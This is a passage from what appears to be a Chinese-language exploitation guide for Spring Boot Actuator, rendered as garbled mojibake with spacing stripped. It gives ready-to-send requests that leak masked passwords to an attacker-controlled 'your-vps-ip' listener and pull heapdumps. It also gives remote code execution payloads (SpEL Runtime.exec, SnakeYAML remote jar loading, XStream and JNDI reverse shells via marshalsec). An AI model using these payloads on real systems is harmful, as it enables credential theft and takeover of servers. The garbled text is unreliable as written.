‡ä½¿ç”¨äº†jolokia-coreä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åGETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæˆ–/actuator/envæ¥å£ï¼Œæœç´¢******å…³é”®è¯ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·*é®æ©çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§åã€‚æ­¥éª¤äºŒï¼šjolokiaè°ƒç”¨ç›¸å…³Mbeanè·å–æ˜æ–‡å°†ä¸‹é¢ç¤ºä¾‹ä¸­çš„security.user.passwordæ›¿æ¢ä¸ºå®é™…è¦è·å–çš„å±æ€§åï¼Œç›´æ¥å‘åŒ…ï¼›æ˜æ–‡å€¼ç»“æœåŒ…å«åœ¨responseæ•°æ®åŒ…ä¸­çš„valueé”®ä¸­ã€‚è°ƒç”¨org.springframework.bootMbeanï¼ˆå¯èƒ½æ›´é€šç”¨ï¼‰å®é™…ä¸Šæ˜¯è°ƒç”¨org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrarç±»å®ä¾‹çš„getPropertyæ–¹æ³•spring1.xPOST/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}spring2.xPOST/actuator/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}è°ƒç”¨org.springframework.cloud.context.environmentMbeanï¼ˆéœ€è¦springcloudç›¸å…³ä¾èµ–ï¼‰å®é™…ä¸Šæ˜¯è°ƒç”¨org.springframework.cloud.context.environment.EnvironmentManagerç±»å®ä¾‹çš„getPropertyæ–¹æ³•spring1.xPOST/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}spring2.xPOST/actuator/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}0x04ï¼šè·å–è¢«æ˜Ÿå·è„±æ•çš„å¯†ç çš„æ˜æ–‡(æ–¹æ³•äºŒ)è®¿é—®/envæ¥å£æ—¶ï¼Œspringactuatorä¼šå°†ä¸€äº›å¸¦æœ‰æ•æ„Ÿå…³é”®è¯(å¦‚passwordã€secret)çš„å±æ€§åå¯¹åº”çš„å±æ€§å€¼ç”¨*å·æ›¿æ¢è¾¾åˆ°è„±æ•çš„æ•ˆæœåˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥GETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/refreshæ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨spring-boot-starter-actuatorä¾èµ–ï¼‰ç›®æ ‡ä½¿ç”¨äº†spring-cloud-starter-netflix-eureka-clientä¾èµ–ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åGETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæˆ–/actuator/envæ¥å£ï¼Œæœç´¢******å…³é”®è¯ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·*é®æ©çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§åã€‚æ­¥éª¤äºŒï¼šä½¿ç”¨ncç›‘å¬HTTPè¯·æ±‚åœ¨è‡ªå·±æ§åˆ¶çš„å¤–ç½‘æœåŠ¡å™¨ä¸Šç›‘å¬80ç«¯å£ï¼šnc-lvk80æ­¥éª¤ä¸‰ï¼šè®¾ç½®eureka.client.serviceUrl.defaultZoneå±æ€§å°†ä¸‹é¢http://value:${security.user.password}@your-vps-ipä¸­çš„security.user.passwordæ¢æˆè‡ªå·±æƒ³è¦è·å–çš„å¯¹åº”çš„æ˜Ÿå·*é®æ©çš„å±æ€§åï¼›your-vps-ipæ¢æˆè‡ªå·±å¤–ç½‘æœåŠ¡å™¨çš„çœŸå®ipåœ°å€ã€‚spring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ipspring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${security.user.password}@your-vps-ip\"}æ­¥éª¤å››ï¼šåˆ·æ–°é…ç½®spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/jsonæ­¥éª¤äº”ï¼šè§£ç å±æ€§å€¼æ­£å¸¸çš„è¯ï¼Œæ­¤æ—¶ncç›‘å¬çš„æœåŠ¡å™¨ä¼šæ”¶åˆ°ç›®æ ‡å‘æ¥çš„è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«ç±»ä¼¼å¦‚ä¸‹Authorizationå¤´å†…å®¹ï¼šAuthorization:BasicdmFsdWU6MTIzNDU2å°†å…¶ä¸­çš„dmFsdWU6MTIzNDU2éƒ¨åˆ†ä½¿ç”¨base64è§£ç ï¼Œå³å¯è·å¾—ç±»ä¼¼æ˜æ–‡å€¼value:123456ï¼Œå…¶ä¸­çš„123456å³æ˜¯ç›®æ ‡æ˜Ÿå·*è„±æ•å‰çš„å±æ€§å€¼æ˜æ–‡ã€‚0x05ï¼šè·å–è¢«æ˜Ÿå·è„±æ•çš„å¯†ç çš„æ˜æ–‡(æ–¹æ³•ä¸‰)è®¿é—®/envæ¥å£æ—¶ï¼Œspringactuatorä¼šå°†ä¸€äº›å¸¦æœ‰æ•æ„Ÿå…³é”®è¯(å¦‚passwordã€secret)çš„å±æ€§åå¯¹åº”çš„å±æ€§å€¼ç”¨*å·æ›¿æ¢è¾¾åˆ°è„±æ•çš„æ•ˆæœåˆ©ç”¨æ¡ä»¶ï¼šé€šè¿‡POST/envè®¾ç½®å±æ€§è§¦å‘ç›®æ ‡å¯¹å¤–ç½‘æŒ‡å®šåœ°å€å‘èµ·ä»»æ„httpè¯·æ±‚ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šå‚è€ƒUUUUnotfoundæå‡ºçš„issue-1ï¼Œå¯ä»¥åœ¨ç›®æ ‡å‘å¤–éƒ¨httpè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨urlpathä¸­åˆ©ç”¨å ä½ç¬¦å¸¦å‡ºæ•°æ®æ­¥éª¤ä¸€ï¼šæ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åGETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæˆ–/actuator/envæ¥å£ï¼Œæœç´¢******å…³é”®è¯ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·*é®æ©çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§åã€‚æ­¥éª¤äºŒï¼šä½¿ç”¨ncç›‘å¬HTTPè¯·æ±‚åœ¨è‡ªå·±æ§åˆ¶çš„å¤–ç½‘æœåŠ¡å™¨ä¸Šç›‘å¬80ç«¯å£ï¼šnc-lvk80æ­¥éª¤ä¸‰ï¼šè§¦å‘å¯¹å¤–httpè¯·æ±‚spring.cloud.bootstrap.locationæ–¹æ³•ï¼ˆåŒæ—¶é€‚ç”¨äºæ˜æ–‡æ•°æ®ä¸­æœ‰ç‰¹æ®Šurlå­—ç¬¦çš„æƒ…å†µï¼‰ï¼šspring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=${security.user.password}\"}eureka.client.serviceUrl.defaultZoneæ–¹æ³•ï¼ˆä¸é€‚ç”¨äºæ˜æ–‡æ•°æ®ä¸­æœ‰ç‰¹æ®Šurlå­—ç¬¦çš„æƒ…å†µï¼‰ï¼šspring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/${security.user.password}\"}æ­¥éª¤å››ï¼šåˆ·æ–°é…ç½®spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json0x06ï¼šè·å–è¢«æ˜Ÿå·è„±æ•çš„å¯†ç çš„æ˜æ–‡(æ–¹æ³•å››)è®¿é—®/envæ¥å£æ—¶ï¼Œspringactuatorä¼šå°†ä¸€äº›å¸¦æœ‰æ•æ„Ÿå…³é”®è¯(å¦‚passwordã€secret)çš„å±æ€§åå¯¹åº”çš„å±æ€§å€¼ç”¨*å·æ›¿æ¢è¾¾åˆ°è„±æ•çš„æ•ˆæœåˆ©ç”¨æ¡ä»¶ï¼šå¯æ­£å¸¸GETè¯·æ±‚ç›®æ ‡/heapdumpæˆ–/actuator/heapdumpæ¥å£åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åGETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæˆ–/actuator/envæ¥å£ï¼Œæœç´¢******å…³é”®è¯ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·*é®æ©çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§åã€‚æ­¥éª¤äºŒï¼šä¸‹è½½jvmheapä¿¡æ¯ä¸‹è½½çš„heapdumpæ–‡ä»¶å¤§å°é€šå¸¸åœ¨50Mâ€”500Mä¹‹é—´ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯èƒ½ä¼šå¤§äº2GGETè¯·æ±‚ç›®æ ‡çš„/heapdumpæˆ–/actuator/heapdumpæ¥å£ï¼Œä¸‹è½½åº”ç”¨å®æ—¶çš„JVMå †ä¿¡æ¯æ­¥éª¤ä¸‰ï¼šä½¿ç”¨MATè·å¾—jvmheapä¸­çš„å¯†ç æ˜æ–‡å‚è€ƒæ–‡ç« æ–¹æ³•ï¼Œä½¿ç”¨EclipseMemoryAnalyzerå·¥å…·çš„OQLè¯­å¥select*fromorg.springframework.web.context.support.StandardServletEnvironmentï¼Œè¾…åŠ©å¿«é€Ÿè¿‡æ»¤åˆ†æï¼Œè·å¾—å¯†ç æ˜æ–‡äºŒï¼šè¿œç¨‹ä»£ç æ‰§è¡Œç”±äºspringbootç›¸å…³æ¼æ´å¯èƒ½æ˜¯å¤šä¸ªç»„ä»¶æ¼æ´ç»„åˆå¯¼è‡´çš„ï¼Œæ‰€ä»¥æœ‰äº›æ¼æ´åå­—èµ·çš„ä¸å¤ªæ­£è§„ï¼Œä»¥èƒ½åŒºåˆ†ä¸ºå‡†0x01ï¼šwhitelabelerrorpageSpELRCEåˆ©ç”¨æ¡ä»¶ï¼šspringboot1.1.0-1.1.12ã€1.2.0-1.2.7ã€1.3.0è‡³å°‘çŸ¥é“ä¸€ä¸ªè§¦å‘springbooté»˜è®¤é”™è¯¯é¡µé¢çš„æ¥å£åŠå‚æ•°ååˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ‰¾åˆ°ä¸€ä¸ªæ­£å¸¸ä¼ å‚å¤„æ¯”å¦‚å‘ç°è®¿é—®/article?id=xxxï¼Œé¡µé¢ä¼šæŠ¥çŠ¶æ€ç ä¸º500çš„é”™è¯¯ï¼šWhitelabelErrorPageï¼Œåˆ™åç»­payloadéƒ½å°†ä¼šåœ¨å‚æ•°idå¤„å°è¯•ã€‚æ­¥éª¤äºŒï¼šæ‰§è¡ŒSpELè¡¨è¾¾å¼è¾“å…¥/article?id=${7*7}ï¼Œå¦‚æœå‘ç°æŠ¥é”™é¡µé¢å°†7*7çš„å€¼49è®¡ç®—å‡ºæ¥æ˜¾ç¤ºåœ¨æŠ¥é”™é¡µé¢ä¸Šï¼Œé‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®å®šç›®æ ‡å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚ç”±å­—ç¬¦ä¸²æ ¼å¼è½¬æ¢æˆ0x**javaå­—èŠ‚å½¢å¼ï¼Œæ–¹ä¾¿æ‰§è¡Œä»»æ„ä»£ç ï¼š#coding:utf-8result=\"\"target='open-aCalculator'forxintarget:result+=hex(ord(x))+\",\"print(result.rstrip(','))æ‰§è¡Œopen-aCalculatorå‘½ä»¤${T(java.lang.Runtime).getRuntime().exec(newString(newbyte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}æ¼æ´åŸç†ï¼šspringbootå¤„ç†å‚æ•°å€¼å‡ºé”™ï¼Œæµç¨‹è¿›å…¥org.springframework.util.PropertyPlaceholderHelperç±»ä¸­æ­¤æ—¶URLä¸­çš„å‚æ•°å€¼ä¼šç”¨parseStringValueæ–¹æ³•è¿›è¡Œé€’å½’è§£æå…¶ä¸­${}åŒ…å›´çš„å†…å®¹éƒ½ä¼šè¢«org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfigurationç±»çš„resolvePlaceholderæ–¹æ³•å½“ä½œSpELè¡¨è¾¾å¼è¢«è§£ææ‰§è¡Œï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tSpringBootSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´-åˆ†æä¸å¤ç°æ¼æ´ç¯å¢ƒï¼šrepository/springboot-spel-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9091/article?id=66æ‰§è¡Œopen-aCalculatorå‘½ä»¤ï¼šhttp://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}0x02ï¼šspringcloudSnakeYAMLRCEåˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæ¥å£è®¾ç½®å±æ€§å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/refreshæ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨spring-boot-starter-actuatorä¾èµ–ï¼‰ç›®æ ‡ä¾èµ–çš„spring-cloud-starterç‰ˆæœ¬&lt;1.3.0.RELEASEç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„HTTPæœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ‰˜ç®¡ymlå’Œjaræ–‡ä»¶åœ¨è‡ªå·±æ§åˆ¶çš„vpsæœºå™¨ä¸Šå¼€å¯ä¸€ä¸ªç®€å•HTTPæœåŠ¡å™¨ï¼Œç«¯å£å°½é‡ä½¿ç”¨å¸¸è§HTTPæœåŠ¡ç«¯å£ï¼ˆ80ã€443ï¼‰#ä½¿ç”¨pythonå¿«é€Ÿå¼€å¯httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ç½®åç¼€ä¸ºymlçš„æ–‡ä»¶example.ymlï¼Œå†…å®¹å¦‚ä¸‹ï¼š!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\"http://your-vps-ip/example.jar\"]]]]åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ç½®åç¼€ä¸ºjarçš„æ–‡ä»¶example.jarï¼Œå†…å®¹æ˜¯è¦æ‰§è¡Œçš„ä»£ç ï¼Œä»£ç ç¼–å†™åŠç¼–è¯‘æ–¹å¼å‚è€ƒyaml-payloadã€‚æ­¥éª¤äºŒï¼šè®¾ç½®spring.cloud.bootstrap.locationå±æ€§spring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/example.ymlspring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/example.yml\"}æ­¥éª¤ä¸‰ï¼šåˆ·æ–°é…ç½®spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/jsonæ¼æ´åŸç†ï¼šspring.cloud.bootstrap.locationå±æ€§è¢«è®¾ç½®ä¸ºå¤–éƒ¨æ¶æ„ymlæ–‡ä»¶URLåœ°å€refreshè§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹HTTPæœåŠ¡å™¨ä¸Šçš„ymlæ–‡ä»¶ï¼Œè·å¾—å…¶å†…å®¹SnakeYAMLç”±äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥è§£ææ¶æ„ymlå†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œå…ˆæ˜¯è§¦å‘java.net.URLå»æ‹‰å–è¿œç¨‹HTTPæœåŠ¡å™¨ä¸Šçš„æ¶æ„jaræ–‡ä»¶ç„¶åæ˜¯å¯»æ‰¾jaræ–‡ä»¶ä¸­å®ç°javax.script.ScriptEngineFactoryæ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tExploitSpringBootActuatorä¹‹SpringCloudEnvå­¦ä¹ ç¬”è®°æ¼æ´ç¯å¢ƒï¼šrepository/springcloud-snakeyaml-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9092/env0x03ï¼šeurekaxstreamdeserializationRCEåˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæ¥å£è®¾ç½®å±æ€§å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/refreshæ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨spring-boot-starter-actuatorä¾èµ–ï¼‰ç›®æ ‡ä½¿ç”¨çš„eureka-client&lt;1.8.7ï¼ˆé€šå¸¸åŒ…å«åœ¨spring-cloud-starter-netflix-eureka-clientä¾èµ–ä¸­ï¼‰ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„HTTPæœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæ¶è®¾å“åº”æ¶æ„XStreampayloadçš„ç½‘ç«™æä¾›ä¸€ä¸ªä¾èµ–Flaskå¹¶ç¬¦åˆè¦æ±‚çš„pythonè„šæœ¬ç¤ºä¾‹ï¼Œä½œç”¨æ˜¯åˆ©ç”¨ç›®æ ‡Linuxæœºå™¨ä¸Šè‡ªå¸¦çš„pythonæ¥åå¼¹shellã€‚ä½¿ç”¨pythonåœ¨è‡ªå·±æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šè¿è¡Œä»¥ä¸Šçš„è„šæœ¬ï¼Œå¹¶æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹è„šæœ¬ä¸­åå¼¹shellçš„ipåœ°å€å’Œç«¯å£å·ã€‚æ­¥éª¤äºŒï¼šç›‘å¬åå¼¹shellçš„ç«¯å£ä¸€èˆ¬ä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œç­‰å¾…åå¼¹shellnc-lvp443æ­¥éª¤ä¸‰ï¼šè®¾ç½®eureka.client.serviceUrl.defaultZoneå±æ€§spring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/examplespring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"}æ­¥éª¤å››ï¼šåˆ·æ–°é…ç½®spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/jsonæ¼æ´åŸç†ï¼šeureka.client.serviceUrl.defaultZoneå±æ€§è¢«è®¾ç½®ä¸ºæ¶æ„çš„å¤–éƒ¨eurekaserverURLåœ°å€refreshè§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹URLï¼Œæå‰æ¶è®¾çš„fakeeurekaserverå°±ä¼šè¿”å›æ¶æ„çš„payloadç›®æ ‡æœºå™¨ç›¸å…³ä¾èµ–è§£æpayloadï¼Œè§¦å‘XStreamååºåˆ—åŒ–ï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tSpringBootActuatorä»æœªæˆæƒè®¿é—®åˆ°getshellæ¼æ´ç¯å¢ƒï¼šrepository/springboot-eureka-xstream-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9093/env0x04ï¼šjolokialogbackJNDIRCEåˆ©ç”¨æ¡ä»¶ï¼šç›®æ ‡ç½‘ç«™å­˜åœ¨/jolokiaæˆ–/actuator/jolokiaæ¥å£ç›®æ ‡ä½¿ç”¨äº†jolokia-coreä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰å¹¶ä¸”ç¯å¢ƒä¸­å­˜åœ¨ç›¸å…³MBeanç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„HTTPæœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰JNDIæ³¨å…¥å—ç›®æ ‡JDKç‰ˆæœ¬å½±å“ï¼Œjdk&lt;6u201/7u191/8u182/11.0.1ï¼ˆLDAPæ–¹å¼ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæŸ¥çœ‹å·²å­˜åœ¨çš„MBeansè®¿é—®/jolokia/listæ¥å£ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨ch.qos.logback.classic.jmx.JMXConfiguratorå’ŒreloadByURLå…³é”®è¯ã€‚æ­¥éª¤äºŒï¼šæ‰˜ç®¡xmlæ–‡ä»¶åœ¨è‡ªå·±æ§åˆ¶çš„vpsæœºå™¨ä¸Šå¼€å¯ä¸€ä¸ªç®€å•HTTPæœåŠ¡å™¨ï¼Œç«¯å£å°½é‡ä½¿ç”¨å¸¸è§HTTPæœåŠ¡ç«¯å£ï¼ˆ80ã€443ï¼‰#ä½¿ç”¨pythonå¿«é€Ÿå¼€å¯httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80åœ¨æ ¹ç›®å½•æ”¾ç½®ä»¥xmlç»“å°¾çš„example.xmlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;configuration&gt;&lt;insertFromJNDIenv-entry-name=\"ldap://your-vps-ip:1389/JNDIObject\"as=\"appName\"/&gt;&lt;/configuration&gt;æ­¥éª¤ä¸‰ï¼šå‡†å¤‡è¦æ‰§è¡Œçš„Javaä»£ç ç¼–å†™ä¼˜åŒ–è¿‡åçš„ç”¨æ¥åå¼¹shellçš„Javaç¤ºä¾‹ä»£ç JNDIObject.javaï¼Œä½¿ç”¨å…¼å®¹ä½ç‰ˆæœ¬jdkçš„æ–¹å¼ç¼–è¯‘ï¼šjavac-source1.5-target1.5JNDIObject.javaç„¶åå°†ç”Ÿæˆçš„JNDIObject.classæ–‡ä»¶æ‹·è´åˆ°æ­¥éª¤äºŒä¸­çš„ç½‘ç«™æ ¹ç›®å½•ã€‚æ­¥éª¤å››ï¼šæ¶è®¾æ¶æ„ldapæœåŠ¡ä¸‹è½½marshalsecï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤æ¶è®¾å¯¹åº”çš„ldapæœåŠ¡ï¼šjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServerhttp://your-vps-ip:80/#JNDIObject1389æ­¥éª¤äº”ï¼šç›‘å¬åå¼¹shellçš„ç«¯å£ä¸€èˆ¬ä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œç­‰å¾…åå¼¹shellnc-lv443æ­¥éª¤å…­ï¼šä»å¤–éƒ¨URLåœ°å€åŠ è½½æ—¥å¿—é…ç½®æ–‡ä»¶âš ï¸å¦‚æœç›®æ ‡æˆåŠŸè¯·æ±‚äº†example.xmlå¹¶ä¸”marshalsecä¹Ÿæ¥æ”¶åˆ°äº†ç›®æ ‡è¯·æ±‚ï¼Œä½†æ˜¯ç›®æ ‡æ²¡æœ‰è¯·æ±‚JNDIObject.classï¼Œå¤§æ¦‚ç‡æ˜¯å› ä¸ºç›®æ ‡ç¯å¢ƒçš„jdkç‰ˆæœ¬å¤ªé«˜ï¼Œå¯¼è‡´JNDIåˆ©ç”¨å¤±è´¥ã€‚æ›¿æ¢å®é™…çš„your-vps-ipåœ°å€è®¿é—®URLè§¦å‘æ¼æ´ï¼š/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xmlæ¼æ´åŸç†ï¼šç›´æ¥è®¿é—®å¯è§¦å‘æ¼æ´çš„URLï¼Œç›¸å½“äºé€šè¿‡jolokiaè°ƒç”¨ch.qos.logback.classic.jmx.JMXConfiguratorç±»çš„reloadByURLæ–¹æ³•ç›®æ ‡æœºå™¨è¯·æ±‚å¤–éƒ¨æ—¥å¿—é…ç½®æ–‡ä»¶URLåœ°å€ï¼Œè·å¾—æ¶æ„xmlæ–‡ä»¶å†…å®¹ç›®æ ‡æœºå™¨ä½¿ç”¨saxParser.parseè§£æxmlæ–‡ä»¶(è¿™é‡Œå¯¼è‡´äº†xxeæ¼æ´)xmlæ–‡ä»¶ä¸­åˆ©ç”¨logbackä¾èµ–çš„insertFormJNDIæ ‡ç­¾ï¼Œè®¾ç½®äº†å¤–éƒ¨JNDIæœåŠ¡å™¨åœ°å€ç›®æ ‡æœºå™¨è¯·æ±‚æ¶æ„JNDIæœåŠ¡å™¨ï¼Œå¯¼è‡´JNDIæ³¨å…¥ï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tspringbootactuatorrceviajolokiaæ¼æ´ç¯å¢ƒï¼šrepository/springboot-jolokia-logback-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9094/env0x05ï¼šjolokiaRealmJNDIRCEåˆ©ç”¨æ¡ä»¶ï¼šç›®æ ‡ç½‘ç«™å­˜åœ¨/jolokiaæˆ–/actuator/jolokiaæ¥å£ç›®æ ‡ä½¿ç”¨äº†jolokia-coreä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰å¹¶ä¸”ç¯å¢ƒä¸­å­˜åœ¨ç›¸å…³MBeanç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰JNDIæ³¨å…¥å—ç›®æ ‡JDKç‰ˆæœ¬å½±å“ï¼Œjdk&lt;6u141/7u131/8u121ï¼ˆRMIæ–¹å¼ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæŸ¥çœ‹å·²å­˜åœ¨çš„MBeansè®¿é—®/jolokia/listæ¥å£ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨type=MBeanFactoryå’ŒcreateJNDIRealmå…³é”®è¯ã€‚æ­¥éª¤äºŒï¼šå‡†å¤‡è¦æ‰§è¡Œçš„Javaä»£ç ç¼–å†™ä¼˜åŒ–è¿‡åçš„ç”¨æ¥åå¼¹shellçš„Javaç¤ºä¾‹ä»£ç JNDIObject.javaã€‚æ­¥éª¤ä¸‰ï¼šæ‰˜ç®¡classæ–‡ä»¶åœ¨è‡ªå·±æ§åˆ¶çš„vpsæœºå™¨ä¸Šå¼€å¯ä¸€ä¸ªç®€å•HTTPæœåŠ¡å™¨ï¼Œç«¯å£å°½é‡ä½¿ç”¨å¸¸è§HTTPæœåŠ¡ç«¯å£ï¼ˆ80ã€443ï¼‰#ä½¿ç”¨pythonå¿«é€Ÿå¼€å¯httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80å°†æ­¥éª¤äºŒä¸­ç¼–è¯‘å¥½çš„classæ–‡ä»¶æ‹·è´åˆ°HTTPæœåŠ¡å™¨æ 